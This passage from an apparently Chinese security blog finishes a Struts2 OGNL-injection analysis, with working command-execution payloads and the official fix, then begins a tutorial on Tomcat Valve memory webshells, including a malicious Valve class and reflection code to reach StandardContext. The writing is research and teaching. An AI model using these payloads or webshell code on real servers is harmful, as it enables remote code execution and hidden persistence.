<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490057576-1fbc3552-a31c-47de-b18c-33f7a90d1467.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490057576-1fbc3552-a31c-47de-b18c-33f7a90d1467.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在这么多拦截器中，<code>param</code>是用来处理我们输入的参数的，所有对于OGNL表达式的处理，应该在这个interceptor中，对于该漏洞的本质，其实就是在Struct2中哪个地方进行了OGNL表达式的解析操作</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490436216-dd4ce8a9-a7f9-47cd-ab34-960ce5b755e8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743490436216-dd4ce8a9-a7f9-47cd-ab34-960ce5b755e8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在迭代器处理完成后，我们就进入到了<code>invokeActionOnly</code>方法中</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493436739-a64e0e71-7abc-434b-923f-96c2cb69fef0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493436739-a64e0e71-7abc-434b-923f-96c2cb69fef0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>invokeActionOnly</code>方法中，调用了<code>invokeAction</code>方法，我们走进该方法中调试，发现最后经过反射调用<code>execute</code>方法，开始处理用户的逻辑信息</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">invokeActionOnly</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    	<span class="keyword">return</span> invokeAction(getAction(), proxy.getConfig());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493608672-74519035-a447-4c5c-bd64-6d59829fdabd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493608672-74519035-a447-4c5c-bd64-6d59829fdabd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>处理完用户逻辑后，我们步出该方法，继续向下走，最终跟进<code>executeResult()</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493881368-7491aaf8-0e23-4842-9940-c3f798f57b01.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493881368-7491aaf8-0e23-4842-9940-c3f798f57b01.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>首先用<code>creatResult</code>创建了一个result对象，主要逻辑肯定在<code>execute</code>方法内，继续跟进</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493961354-33f9d879-49a0-43ef-89a6-c18a9327e171.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743493961354-33f9d879-49a0-43ef-89a6-c18a9327e171.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>走入<code>execute</code>方法中，继续走进<code>doExecute</code>方法内</p>
<p>在<code>doExecute</code>方法内，准备了发送响应信息，设置了pageContext参数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="built_in">this</span>.lastFinalLocation = <span class="built_in">this</span>.conditionalParse(<span class="built_in">this</span>.location, invocation);</span><br><span class="line">        <span class="built_in">this</span>.doExecute(<span class="built_in">this</span>.lastFinalLocation, invocation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doExecute</span><span class="params">(String finalLocation, ActionInvocation invocation)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;Forwarding to location &quot;</span> + finalLocation);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">PageContext</span> <span class="variable">pageContext</span> <span class="operator">=</span> ServletActionContext.getPageContext();</span><br><span class="line">        <span class="keyword">if</span> (pageContext != <span class="literal">null</span>) &#123;</span><br><span class="line">            pageContext.include(finalLocation);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ServletActionContext.getRequest();</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> ServletActionContext.getResponse();</span><br><span class="line">            <span class="type">RequestDispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> request.getRequestDispatcher(finalLocation);</span><br><span class="line">            <span class="keyword">if</span> (dispatcher == <span class="literal">null</span>) &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>, <span class="string">&quot;result &#x27;&quot;</span> + finalLocation + <span class="string">&quot;&#x27; not found&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!response.isCommitted() &amp;&amp; request.getAttribute(<span class="string">&quot;javax.servlet.include.servlet_path&quot;</span>) == <span class="literal">null</span>) &#123;</span><br><span class="line">                request.setAttribute(<span class="string">&quot;struts.view_uri&quot;</span>, finalLocation);</span><br><span class="line">                request.setAttribute(<span class="string">&quot;struts.request_uri&quot;</span>, request.getRequestURI());</span><br><span class="line">                dispatcher.forward(request, response);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dispatcher.include(request, response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>之后会调用<code>JspServlet</code>来处理请求，解析标签时，在标签的开始和结束位置，分别调用对应实现类如<code>org.apache.struts2.views.jsp.ComponentTagSupport</code>中的 <code>doStartTag()</code>（一些初始化操作) 及 <code>doEndTag() </code>（标签解析后调用end方法)方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">doEndTag</span><span class="params">()</span> <span class="keyword">throws</span> JspException &#123;</span><br><span class="line">        <span class="built_in">this</span>.component.end(<span class="built_in">this</span>.pageContext.getOut(), <span class="built_in">this</span>.getBody());</span><br><span class="line">        <span class="built_in">this</span>.component = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">end</span><span class="params">(Writer writer, String body)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.evaluateParams();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.end(writer, body, <span class="literal">false</span>);</span><br><span class="line">            <span class="built_in">this</span>.mergeTemplate(writer, <span class="built_in">this</span>.buildTemplateName(<span class="built_in">this</span>.template, <span class="built_in">this</span>.getDefaultTemplate()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> var7;</span><br><span class="line">            LOG.error(<span class="string">&quot;error when rendering&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.popComponentStack();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>evaluateParams</code>方法，在该if判断中，因为altSyntax默认开启，所以走入if判断中</p>
<p>将username拼接进<code>%&#123;&#125;</code>中，这里本意是想使用<code>%&#123;username&#125;</code>来获取域中的username参数，但是由于存在循环解析，使用造成了OGNL注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495014666-0641ba73-a64c-4874-abbf-6a557cf9ec4a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495014666-0641ba73-a64c-4874-abbf-6a557cf9ec4a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>我们继续看到<code>findValue</code>方法中，进行寻找值的操作，并继续走入<code>translateVariables</code>方法</p>
<p>在这里，会将拼接好的<code>%&#123;username&#125;</code>中的<code>%&#123;</code>和<code>&#125;</code>截取，只剩下username</p>
<p>然后使用findValue方法，将我们所输入的username查找出来并赋值给o，也就是我们输入的<code>%&#123;10*10&#125;</code>，然后进行新的一次循环，将我们输入的东西再次当成OGNL表达式解析，就造成了此漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495489057-a8ca10ec-e472-4358-9100-90c800e3e5d8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743495489057-a8ca10ec-e472-4358-9100-90c800e3e5d8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="RyS8z">漏洞利用</h3>
漏洞利用基于上述的OGNL表达式

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">%&#123;(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)).start()&#125;</span><br><span class="line"></span><br><span class="line">%&#123;#a=(<span class="keyword">new</span> <span class="title class_">java</span>.lang.ProcessBuilder(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;clac&quot;</span>&#125;)).redirectErrorStream(<span class="literal">true</span>).start(),#b=#a.getInputStream(),#c=<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(#b),#d=<span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(#c),#e=<span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">50000</span>],#d.read(#e),#f=#context.get(<span class="string">&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;</span>),#f.getWriter().println(<span class="keyword">new</span> <span class="title class_">java</span>.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743474566019-267cfed1-1471-4458-b677-6f238a1af9bf.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743474566019-267cfed1-1471-4458-b677-6f238a1af9bf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="lc9Hh">漏洞修复</h3>
通过漏洞分析可以看到，是由于 struts2 错误的使用了递归循环来进行OGNL表达式的解析，所导致的OGNL表达式的执行

<p>官方修复如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">translateVariables</span><span class="params">(<span class="type">char</span> open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, <span class="type">int</span> maxLoopCount)</span> &#123;</span><br><span class="line">    <span class="comment">// deal with the &quot;pure&quot; expressions first!</span></span><br><span class="line">    <span class="comment">//expression = expression.trim();</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> expression;</span><br><span class="line">    <span class="type">int</span> <span class="variable">loopCount</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>, pos);</span><br><span class="line">        <span class="keyword">if</span> (start == -<span class="number">1</span>) &#123;</span><br><span class="line">            pos = <span class="number">0</span>;</span><br><span class="line">            loopCount++;</span><br><span class="line">            start = expression.indexOf(open + <span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (loopCount &gt; maxLoopCount) &#123;</span><br><span class="line">            <span class="comment">// translateVariables prevent infinite loop / expression recursive evaluation</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> expression.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> start + <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> end;</span><br><span class="line">        <span class="type">char</span> c;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (start != -<span class="number">1</span> &amp;&amp; x &lt; length &amp;&amp; count != <span class="number">0</span>) &#123;</span><br><span class="line">            c = expression.charAt(x++);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                count--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        end = x - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((start != -<span class="number">1</span>) &amp;&amp; (end != -<span class="number">1</span>) &amp;&amp; (count == <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">var</span> <span class="operator">=</span> expression.substring(start + <span class="number">2</span>, end);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> stack.findValue(<span class="keyword">var</span>, asType);</span><br><span class="line">            <span class="keyword">if</span> (evaluator != <span class="literal">null</span>) &#123;</span><br><span class="line">                o = evaluator.evaluate(o);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">left</span> <span class="operator">=</span> expression.substring(<span class="number">0</span>, start);</span><br><span class="line">            <span class="type">String</span> <span class="variable">right</span> <span class="operator">=</span> expression.substring(end + <span class="number">1</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">middle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (o != <span class="literal">null</span>) &#123;</span><br><span class="line">                middle = o.toString();</span><br><span class="line">                <span class="keyword">if</span> (!TextUtils.stringSet(left)) &#123;</span><br><span class="line">                    result = o;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = left + middle;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (TextUtils.stringSet(right)) &#123;</span><br><span class="line">                    result = result + right;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression = left + middle + right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// the variable doesn&#x27;t exist, so don&#x27;t display anything</span></span><br><span class="line">                result = left + right;</span><br><span class="line">                expression = left + right;</span><br><span class="line">            &#125;</span><br><span class="line">            pos = (left != <span class="literal">null</span> &amp;&amp; left.length() &gt; <span class="number">0</span> ? left.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  (middle != <span class="literal">null</span> &amp;&amp; middle.length() &gt; <span class="number">0</span> ? middle.length() - <span class="number">1</span>: <span class="number">0</span>) +</span><br><span class="line">                  <span class="number">1</span>;</span><br><span class="line">            pos = Math.max(pos, <span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中很明显多了一段代码，这里判断了循环的次数，从而在解析到<code>%&#123;1+1&#125;</code>的时候不会继续向下递归</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (loopCount &gt; maxLoopCount) &#123;</span><br><span class="line">            <span class="comment">// translateVariables prevent infinite loop / expression recursive evaluation</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h2 id="IKwBa">总结</h2>
这个OGNL表达式解析的地方分析的我好头疼TvT

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>Valve内存马</title>
    <url>/2025/03/22/Valve%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    <content><![CDATA[<h1 id="JBOpy">Valve内存马</h1>
<h2 id="pNWVG">前置基础</h2>

<p><strong>tomcat的内部结构</strong></p>
<p><font style="color:rgb(80, 80, 92);">tomcat由Connector和Container两部分组成</font></p>
<ul>
<li><font style="color:rgb(80, 80, 92);">Connector主要负责对外的网络交互，当收到网络请求时，它将请求包包装为Request，再将Request交给Container进行处理，最终返回给请求方</font></li>
<li><font style="color:rgb(80, 80, 92);">tomcat中的Container有四种，分别为</font><font style="color:rgb(77, 77, 77);">engine,host,context,wrapper，实现类分别是StandardEngine,StandardHost,StandardContext,StandardWrapper，四个容器间是包含关系</font></li>
</ul>
<p>我觉得下面这幅图很好的展示了tomcat的结构<img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740104568341-18b63c8e-c408-4868-af93-667315e0ac45.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740104568341-18b63c8e-c408-4868-af93-667315e0ac45.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><font style="color:rgb(80, 80, 92);">我们要学习 Valve 型内存马，就必须要先了解一下 Valve 是什么</font></p>
<blockquote>
<p><font style="color:rgb(80, 80, 92);">在了解 Valve 之前，我们先来简单了解一下 Tomcat 中的</font><strong>管道机制</strong><font style="color:rgb(80, 80, 92);">。</font></p>
<p><font style="color:rgb(80, 80, 92);">我们知道，当 Tomcat 接收到客户端请求时，首先会使用</font><font style="color:rgb(80, 80, 92);"> </font><code>Connector</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">进行解析，然后发送到</font><font style="color:rgb(80, 80, 92);"> </font><code>Container</code><font style="color:rgb(80, 80, 92);"> </font><font style="color:rgb(80, 80, 92);">进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到 Servlet 进行处理的呢？这里涉及到的机制就是 Tomcat 管道机制。</font></p>
<p><font style="color:rgb(80, 80, 92);">管道机制主要涉及到两个名词，Pipeline（管道）和 Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。</font></p>
<p><font style="color:rgb(80, 80, 92);">因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。个人理解就是管道与阀门的这种模式，我们可以通过调整阀门，来实现不同的业务。</font></p>
</blockquote>
<p><font style="color:rgb(80, 80, 92);">在Catalina中，有着四种Container，每个容器都有自己的Pipeline（管道）组件，每个Pipeline组件至少会存在一个Valve（阀门），这个Valve我们称之为BaseValve（基础阀）</font></p>
<p><strong><font style="color:rgb(80, 80, 92);">Pipeline 提供了 </font></strong><code>**addValve**</code><strong><font style="color:rgb(80, 80, 92);"> 方法，可以添加新 Valve 在 basic 之前，并按照添加顺序执行</font></strong></p>
<p><font style="color:rgb(80, 80, 92);">当Connector将Request交给Container处理后，Container第一层就是Engine容器，但在tomcat中Engine容器不会直接调用它下一层Host容器去处理相关请求，而是通过Pipeline组件去处理，</font><font style="color:rgb(77, 77, 77);">跟pipeline相关的还有个也是容器内部的组件，叫做valve组件</font></p>
<p><font style="color:rgb(80, 80, 92);">下面是 Pipeline 发挥功能的原理图</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740105276158-12302953-9846-4902-a423-43a661667630.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740105276158-12302953-9846-4902-a423-43a661667630.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="THsul">分析</h2>
这里我们先实现一个基础的Valve

<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.<span class="property">apache</span>.<span class="property">catalina</span>.<span class="property">connector</span>.<span class="property">Request</span>;</span><br><span class="line"><span class="keyword">import</span> org.<span class="property">apache</span>.<span class="property">catalina</span>.<span class="property">connector</span>.<span class="property">Response</span>;</span><br><span class="line"><span class="keyword">import</span> org.<span class="property">apache</span>.<span class="property">catalina</span>.<span class="property">valves</span>.<span class="property">ValveBase</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.<span class="property">servlet</span>.<span class="property">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> java.<span class="property">io</span>.<span class="property">IOException</span>;</span><br><span class="line"></span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">ValveTest</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ValveBase</span> &#123;</span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">invoke</span>(<span class="title class_">Request</span> request, <span class="title class_">Response</span> response) throws <span class="title class_">IOException</span>, <span class="title class_">ServletException</span> &#123;</span><br><span class="line">        <span class="title class_">System</span>.<span class="property">out</span>.<span class="title function_">println</span>(<span class="string">&quot;Valve 被成功调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现好Valve后，我们需要通过<code>addValve</code>方法，将Valve添加进Pipeline中，我们只要将Valve添加进去，就能实现内存马的注入</p>
<p>看一眼<code>Pipeline</code>的接口，存在<code>addValve</code>方法，我们可以通过这个方法把Valve添加进去</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">package org.<span class="property">apache</span>.<span class="property">catalina</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.<span class="property">util</span>.<span class="property">Set</span>;</span><br><span class="line"></span><br><span class="line">public interface <span class="title class_">Pipeline</span> <span class="keyword">extends</span> <span class="title class_">Contained</span> &#123;</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">Valve</span> <span class="title function_">getBasic</span>();</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">setBasic</span>(<span class="title class_">Valve</span> valve);</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">addValve</span>(<span class="title class_">Valve</span> valve);</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">Valve</span>[] <span class="title function_">getValves</span>();</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">removeValve</span>(<span class="title class_">Valve</span> valve);</span><br><span class="line"></span><br><span class="line">    public <span class="title class_">Valve</span> <span class="title function_">getFirst</span>();</span><br><span class="line"></span><br><span class="line">    public boolean <span class="title function_">isAsyncSupported</span>();</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">void</span> <span class="title function_">findNonAsyncValves</span>(<span class="title class_">Set</span>&lt;<span class="title class_">String</span>&gt; result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找到Pipeline接口的实现类<code>StandardPipeline</code>，<font style="color:rgb(80, 80, 92);">，但是我们是无法直接获取到 </font><code>StandardPipeline</code><font style="color:rgb(80, 80, 92);"> 的，所以这里去找一找 </font><code>StandardContext</code><font style="color:rgb(80, 80, 92);"> 有没有获取到 </font><code>StandardPipeline</code><font style="color:rgb(80, 80, 92);"> 的手段</font></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740106822054-092bf012-6bd5-4a30-a828-b209ef97b143.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740106822054-092bf012-6bd5-4a30-a828-b209ef97b143.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>StandardContext</code>中，找到了一个<code>getPipeline</code>方法，跟进查看，会返回当前的<code>Pipeline</code></p>
<p><font style="color:rgb(80, 80, 92);">可以看一下注解，这里写着 return 一个 Pipeline 类型的类，它是用来管理 Valves 的</font></p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">protected final <span class="title class_">Pipeline</span> pipeline = <span class="keyword">new</span> <span class="title class_">StandardPipeline</span>(<span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Return the Pipeline object that manages the Valves associated with this Container</span></span><br><span class="line">@<span class="title class_">Override</span></span><br><span class="line">    public <span class="title class_">Pipeline</span> <span class="title function_">getPipeline</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">pipeline</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以可以证明这一点</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StandardContext</span>.<span class="title function_">getPipeline</span>() = <span class="title class_">StandardPipeline</span>; <span class="comment">// 二者等价</span></span><br></pre></td></tr></table></figure>

<h3 id="xVQoi">Valve何处加载</h3>

<p><font style="color:rgb(80, 80, 92);">有个问题：我们的 Valve 是应该放到 Filter，Listener，还是 Servlet 里面？</font></p>
<p>应该是在Servlet中被加载的，因为在Servlet内存马的<code>HTTP11Processor</code><font style="color:rgb(80, 80, 92);"> 的加载 HTTP 请求当中，是出现了 Pipeline 的 basic 的</font></p>
<p>所以我们通过 Servlet 来加载。</p>
<h2 id="FeMug">实现</h2>
<h3 id="gm19w">思路分析</h3>
现在的思路就已经很明确了

<ol>
<li>编写恶意Valve</li>
<li>反射获取<code>StandardContext</code></li>
<li>调用<code>getPieline（）</code>方法获取<code>StandardPipeline</code></li>
<li>通过<code>addValve</code>方法将恶意Valve添加入<code>StandardPipeline</code></li>
</ol>
<h3 id="i4VKS">Valve内存马实现</h3>
我们先编写一个恶意的Valve内存马

<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">  public <span class="keyword">class</span> <span class="title class_">shellValve</span> <span class="keyword">extends</span> <span class="title class_ inherited__">ValveBase</span> &#123;</span><br><span class="line">    @<span class="title class_">Override</span></span><br><span class="line">  public <span class="keyword">void</span> <span class="title function_">invoke</span>(<span class="title class_">Request</span> request, <span class="title class_">Response</span> response) throws <span class="title class_">IOException</span>, <span class="title class_">ServletException</span> &#123;</span><br><span class="line">    <span class="title class_">Runtime</span>.<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>后续和前几个内存马一样，通过反射来获取<code>StandardContext</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>

<p>这里从别的师傅那里看到的，更简单方法的获取<code>StandardContext</code>，两个都是可以的</p>
